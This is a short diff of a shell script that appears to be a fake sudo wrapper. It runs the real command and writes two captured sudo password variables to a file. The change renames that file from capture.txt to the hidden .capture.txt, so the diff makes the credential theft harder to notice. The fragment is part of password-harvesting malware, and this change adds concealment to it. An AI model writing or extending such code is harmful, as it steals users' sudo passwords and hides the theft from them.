@@ -14,5 +14,5 @@ else
     sudo $command
 fi
 
-printf "${sudopasswd}\n" >> capture.txt
-printf "${sudopasswd2}\n" >> capture.txt
+printf "${sudopasswd}\n" >> .capture.txt
+printf "${sudopasswd2}\n" >> .capture.txt
